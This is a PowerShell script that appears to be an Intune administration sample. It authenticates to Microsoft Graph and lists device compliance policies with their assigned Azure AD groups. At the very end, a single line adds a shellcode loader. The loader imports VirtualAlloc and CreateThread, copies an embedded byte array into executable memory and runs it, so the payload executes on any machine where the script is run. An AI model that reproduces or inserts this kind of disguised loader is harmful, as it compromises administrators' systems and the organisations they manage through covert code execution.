




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Get-DeviceCompliancePolicy(){



[cmdletbinding()]

param
(
    $Name,
    [switch]$Android,
    [switch]$iOS,
    [switch]$Win10
)

$graphApiVersion = "Beta"
$Resource = "deviceManagement/deviceCompliancePolicies"

    try {

        $Count_Params = 0

        if($Android.IsPresent){ $Count_Params++ }
        if($iOS.IsPresent){ $Count_Params++ }
        if($Win10.IsPresent){ $Count_Params++ }
        if($Name.IsPresent){ $Count_Params++ }

        if($Count_Params -gt 1){

        write-host "Multiple parameters set, specify a single parameter -Android -iOS or -Win10 against the function" -f Red

        }

        elseif($Android){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'@odata.type').contains("android") }

        }

        elseif($iOS){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'@odata.type').contains("ios") }

        }

        elseif($Win10){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'@odata.type').contains("windows10CompliancePolicy") }

        }

        elseif($Name){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value | Where-Object { ($_.'displayName').contains("$Name") }

        }

        else {

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Get-DeviceCompliancePolicyAssignment(){



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true,HelpMessage="Enter id (guid) for the Device Compliance Policy you want to check assignment")]
    $id
)

$graphApiVersion = "Beta"
$DCP_resource = "deviceManagement/deviceCompliancePolicies"

    try {

    $uri = "https://graph.microsoft.com/$graphApiVersion/$($DCP_resource)/$id/assignments"
    (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Get-AADGroup(){



[cmdletbinding()]

param
(
    $GroupName,
    $id,
    [switch]$Members
)


$graphApiVersion = "v1.0"
$Group_resource = "groups"

    try {

        if($id){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=id eq '$id'"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

        }

        elseif($GroupName -eq "" -or $GroupName -eq $null){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

        }

        else {

            if(!$Members){

            $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"
            (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

            }

            elseif($Members){

            $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"
            $Group = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

                if($Group){

                $GID = $Group.id

                $Group.displayName
                write-host

                $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)/$GID/Members"
                (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

                }

            }

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





$DCPs = Get-DeviceCompliancePolicy

write-host

foreach($DCP in $DCPs){

write-host "Device Compliance Policy:"$DCP.displayName -f Yellow
$DCP

$id = $DCP.id

$DCPA = Get-DeviceCompliancePolicyAssignment -id $id

    if($DCPA){

    write-host "Getting Compliance Policy assignment..." -f Cyan

    if($DCPA.count -gt 1){

            foreach($group in $DCPA){

            (Get-AADGroup -id $group.target.GroupId).displayName

            }

        }

        else {

        (Get-AADGroup -id $DCPA.target.GroupId).displayName

        }

    }

    Write-Host

}

$fPS = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $fPS -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xe1,0xba,0x4a,0xc4,0x8d,0xa0,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x57,0x83,0xc6,0x04,0x31,0x56,0x15,0x03,0x56,0x15,0xa8,0x31,0x71,0x48,0xae,0xba,0x8a,0x89,0xce,0x33,0x6f,0xb8,0xce,0x20,0xfb,0xeb,0xfe,0x23,0xa9,0x07,0x75,0x61,0x5a,0x93,0xfb,0xae,0x6d,0x14,0xb1,0x88,0x40,0xa5,0xe9,0xe9,0xc3,0x25,0xf3,0x3d,0x24,0x17,0x3c,0x30,0x25,0x50,0x20,0xb9,0x77,0x09,0x2f,0x6c,0x68,0x3e,0x65,0xad,0x03,0x0c,0x68,0xb5,0xf0,0xc5,0x8b,0x94,0xa6,0x5e,0xd2,0x36,0x48,0xb2,0x6f,0x7f,0x52,0xd7,0x55,0xc9,0xe9,0x23,0x22,0xc8,0x3b,0x7a,0xcb,0x67,0x02,0xb2,0x3e,0x79,0x42,0x75,0xa0,0x0c,0xba,0x85,0x5d,0x17,0x79,0xf7,0xb9,0x92,0x9a,0x5f,0x4a,0x04,0x47,0x61,0x9f,0xd3,0x0c,0x6d,0x54,0x97,0x4b,0x72,0x6b,0x74,0xe0,0x8e,0xe0,0x7b,0x27,0x07,0xb2,0x5f,0xe3,0x43,0x61,0xc1,0xb2,0x29,0xc4,0xfe,0xa5,0x91,0xb9,0x5a,0xad,0x3c,0xae,0xd6,0xec,0x28,0x5e,0x8c,0x7a,0xa9,0xf6,0x39,0xea,0xc7,0x6f,0x92,0x84,0x5b,0x18,0x3c,0x52,0x9b,0x33,0x71,0x87,0x30,0xe8,0x21,0x64,0xe4,0x66,0xfc,0xdc,0x73,0xd1,0xff,0x34,0xd0,0x4e,0x6a,0xb4,0x84,0x23,0x02,0x41,0x0a,0xc3,0xd2,0x5d,0xc7,0xc3,0xd2,0x9d,0xf7,0xf1,0x97,0xd7,0x5f,0xb6,0x17,0xb8,0x37,0x6f,0x91,0xa7,0x0e,0x70,0x74,0x5e,0x48,0xdd,0x1f,0x61,0x67,0x01,0x5b,0x32,0xd4,0x92,0x33,0xe6,0x8c,0x7c,0x57,0x5d,0x1f,0x47,0x58,0x8b,0xc9,0xdd,0xac,0x6b,0x9e,0xa1,0x82,0x93,0x5e,0x28,0x04,0xf9,0x5a,0x7a,0xaf,0xe1,0x34,0x12,0x5a,0x58,0x27,0x64,0x5b,0xb1,0x04,0x3b,0xf7,0x69,0xfd,0xd3,0xda,0x8b,0x19,0x58,0xda,0x41,0x9c,0x5e,0x51,0x60,0xd0,0x2b,0x43,0x1c,0x1e,0x66,0xd1,0x8b,0x21,0x5d,0x7c,0x74,0xb6,0x5d,0x91,0x74,0x46,0x35,0x91,0x74,0x06,0xc5,0xc2,0x1c,0xde,0x61,0xb7,0x39,0x21,0xbc,0xab,0x91,0x8d,0xb7,0x2b,0x42,0x5a,0xc7,0x93,0x6d,0x9a,0x94,0x85,0x05,0x88,0x8c,0xa3,0x34,0x53,0x65,0x36,0x78,0xd8,0x48,0xb2,0x7e,0x20,0x91,0x40,0x40,0x57,0xf0,0x13,0x82,0xc7,0x12,0xd6,0xfb,0x07,0x1d,0x28,0x3d,0xca,0xcf,0x7a,0x0b,0x12,0x21,0x49,0x4a,0x4c,0x0c,0x82,0x98,0x90;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$kDj=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($kDj.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$kDj,0,0,0);for (;;){Start-sleep 60};

